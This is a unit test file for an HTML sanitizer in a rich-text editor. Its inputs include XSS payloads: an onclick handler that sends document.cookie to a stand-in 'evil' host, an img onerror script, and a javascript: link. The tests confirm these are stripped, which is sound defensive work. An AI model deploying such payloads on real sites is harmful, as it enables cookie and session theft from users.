import { describe, it, expect } from 'vitest';
import { sanitizeHtml } from './sanitize-html';

describe('sanitizeHtml', () => {
  it('removes script tags with their content', () => {
    const result = sanitizeHtml('<p>ok</p><script>alert(1)</script>');
    expect(result).not.toContain('<script');
    expect(result).not.toContain('alert(1)');
    expect(result).toContain('<p>ok</p>');
  });

  it('strips event handler attributes on allowed tags (P0 regression)', () => {
    const result = sanitizeHtml(
      '<p onclick="fetch(\'//evil\?t=\'+document.cookie)">正文</p>',
    );
    expect(result).not.toContain('onclick');
    expect(result).toContain('正文');
  });

  it('removes javascript: href but keeps https href', () => {
    const evil = sanitizeHtml('<a href="javascript:alert(1)">x</a>');
    expect(evil).not.toContain('javascript:');
    const safe = sanitizeHtml('<a href="https://example.com">x</a>');
    expect(safe).toContain('href="https://example.com"');
  });

  it('removes img, iframe and style tags', () => {
    const result = sanitizeHtml(
      '<img src=x onerror=alert(1)><iframe src="https://evil"></iframe><style>.x{}</style><p>ok</p>',
    );
    expect(result).not.toContain('<img');
    expect(result).not.toContain('<iframe');
    expect(result).not.toContain('<style');
    expect(result).toContain('<p>ok</p>');
  });

  it('keeps normal editorial formatting intact', () => {
    const html =
      '<h2>标题</h2><p>段落 <strong>加粗</strong> <em>斜体</em></p><ul><li>条目</li></ul><blockquote>引用</blockquote>';
    expect(sanitizeHtml(html)).toBe(html);
  });

  it('keeps simple tables (tiptap table extension output)', () => {
    const html = '<table><tbody><tr><th>头</th><td>格</td></tr></tbody></table>';
    expect(sanitizeHtml(html)).toBe(html);
  });

  it('is idempotent', () => {
    const dirty = '<p onclick="x()">a</p><script>bad()</script><ul><li>b</li></ul>';
    const once = sanitizeHtml(dirty);
    expect(sanitizeHtml(once)).toBe(once);
  });
});
